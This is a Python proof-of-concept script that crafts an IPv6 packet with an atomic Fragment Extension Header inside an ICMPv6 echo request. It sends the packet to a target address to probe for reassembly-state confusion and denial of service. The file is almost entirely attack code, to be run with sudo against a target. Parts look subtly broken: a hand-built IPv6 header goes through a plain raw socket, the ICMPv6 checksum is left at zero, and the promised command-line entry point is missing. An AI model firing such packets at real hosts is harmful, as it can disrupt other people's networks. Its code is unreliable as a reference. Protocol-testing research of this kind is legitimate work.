#!/usr/bin/env python3
"""
Proof-of-Concept: IPv6 Atomic Fragment State Confusion

This script crafts an IPv6 packet with a Fragment Extension Header where both
the Fragment Offset and the M (More Fragments) flag are zero. According to RFC 8200,
this constitutes a 'whole datagram' fragment that should be processed immediately
as a complete packet without entering a reassembly wait state.

Vulnerability: Some implementations may incorrectly treat this as the first fragment
of a multi-fragment packet, waiting for subsequent fragments that will never arrive.
This can lead to resource exhaustion (DoS) or state confusion between firewalls and hosts.

Usage:
    sudo python3 poc_ipv6_atomic_fragment_state_confusion.py <target_ipv6>
"""

import struct
import socket
import sys
import os
import time

# --- Constants ---
IPV6_HDR_LEN = 40
FRAG_HDR_LEN = 8
ICMPV6_ECHO_TYPE = 128
ICMPV6_ECHO_CODE = 0

# --- Helper Functions ---

def build_ipv6_header(src, dst, payload_len, next_hdr, hop_limit=64):
    """
    Constructs an IPv6 header.
    """
    # Version(4) + Traffic Class(8) + Flow Label(20) = 32 bits
    version_tc_flow = (6 << 28) | (0 << 20)  # Version 6, TC=0, Flow=0
    # Payload Length(16) + Next Header(8) + Hop Limit(8)
    payload_next_hop = (payload_len << 16) | (next_hdr << 8) | hop_limit
    
    header = struct.pack('!II', version_tc_flow, payload_next_hop)
    header += src
    header += dst
    return header

def build_fragment_header(next_hdr, frag_offset, m_flag, identification):
    """
    Constructs an IPv6 Fragment Extension Header.
    
    Format:
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |  Next Header  |   Reserved    |      Fragment Offset    |Res|M|
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                         Identification                        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """
    # Pack the first 32 bits: Next Header(8) + Reserved(8) + Fragment Offset(13) + Res(2) + M(1)
    # Fragment Offset is in 8-octet units. We want Offset=0.
    # M flag: 0 means last fragment (or whole datagram if offset is also 0).
    
    # Construct the 32-bit field
    # Next Header: 8 bits
    # Reserved: 8 bits (0)
    # Fragment Offset: 13 bits (0)
    # Res: 2 bits (0)
    # M: 1 bit (0)
    
    first_32 = (next_hdr << 24) | (0 << 16) | (frag_offset << 3) | (0 << 2) | m_flag
    
    header = struct.pack('!II', first_32, identification)
    return header

def build_icmpv6_echo(payload=b'\x41' * 32):
    """
    Constructs an ICMPv6 Echo Request message.
    """
    icmp_type = ICMPV6_ECHO_TYPE
    icmp_code = ICMPV6_ECHO_CODE
    checksum = 0  # Will be calculated by kernel or ignored for PoC
    identifier = 0x1234
    sequence = 0x0001
    
    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence)
    return header + payload

def send_atomic_fragment(src_ip, dst_ip, identification=0xDEADBEEF):
    """
    Crafts and sends an IPv6 packet with an atomic fragment header.
    
    Atomic Fragment: Fragment Offset = 0 AND M flag = 0.
    This should be treated as a complete packet, not a fragment waiting for more.
    """
    # 1. Create the ICMPv6 Echo Request payload
    icmp_payload = build_icmpv6_echo()
    
    # 2. Create the Fragment Header
    # Next Header: 58 (ICMPv6)
    # Fragment Offset: 0
    # M flag: 0 (This is the critical part: Offset=0, M=0)
    # Identification: Random or fixed value
    frag_header = build_fragment_header(
        next_hdr=58,  # ICMPv6
        frag_offset=0,
        m_flag=0,
        identification=identification
    )
    
    # 3. Calculate Payload Length for IPv6 Header
    # Payload = Fragment Header + ICMPv6 Payload
    payload_len = len(frag_header) + len(icmp_payload)
    
    # 4. Create IPv6 Header
    # Next Header: 44 (Fragment Header)
    ipv6_header = build_ipv6_header(
        src=socket.inet_pton(socket.AF_INET6, src_ip),
        dst=socket.inet_pton(socket.AF_INET6, dst_ip),
        payload_len=payload_len,
        next_hdr=44  # Fragment Header
    )
    
    # 5. Assemble the full packet
    packet = ipv6_header + frag_header + icmp_payload
    
    # 6. Send using raw socket
    try:
        sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_IPV6)
        # Set socket timeout to avoid hanging if no response
        sock.settimeout(2.0)
        
        # Send the packet
        sock.sendto(packet, (dst_ip, 0, 0, 0))
        print(f"[*] Sent atomic fragment packet to {dst_ip}")
        print(f"    - Fragment Offset: 0")
        print(f"    - M Flag: 0")
        print(f"    - Identification: 0x{identification:08X}")
        
        # Wait for response
        try:
            data, addr = sock.recvfrom(1500)
            print(f"[+] Received response from {addr[0]}")
            print(f"    - This indicates the target processed the atomic fragment as a complete packet.")
            return True
        except socket.timeout:
            print(f"[-] No response received within timeout.")
            print(f"    - Possible causes:")
            print(f"      1. Target dropped the packet (firewall rule).")
            print(f"      2. Target entered reassembly wait state (vulnerable to state confusion).")
            print(f"      3. ICMP Echo Reply is blocked.")
            return False
        finally:
            sock.close()
            
    except Exception as e:
        print(f"[!] Error sending packet: {e}")
        return False

